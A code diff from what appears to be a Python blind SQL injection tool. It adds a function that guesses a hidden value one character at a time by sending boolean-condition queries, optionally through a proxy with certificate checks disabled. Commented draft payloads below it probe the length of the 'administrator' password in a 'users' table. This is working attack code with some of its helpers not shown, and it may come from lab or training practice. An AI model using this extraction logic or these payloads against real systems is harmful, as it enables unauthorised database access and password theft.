@@ -55,9 +55,26 @@ def determine_response_length(inner_query, url, no_proxy=False):
             log.info(f"length of query response is {response_length}")
             return i
         
+def determine_response_char(task):
+    sess = requests.Session()
+    chars = [ord(x) for x in AVAIL_CHARS]
+    for x in chars:
+        outer_query = format_char_query(task["inner_query"], task["position"], x)
+        prepped = format_request(task["url"], outer_query)
+        if task["no_proxy"]:
+            resp = sess.send(prepped)
+        else:
+            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
+        if is_true(resp):
+            task["result"] = str(chr(x))
+            return task
+
+    
+        
         
 #------------------------------------------------------------------------------------------
 #draft
+
 #xyz' and (select 'a' from users where username = 'administrator' and length(password > 1)) = 'a'-- 
         
 #xyz' or (select length('aaaa')=4)--       //true its return text "welcmoeback"
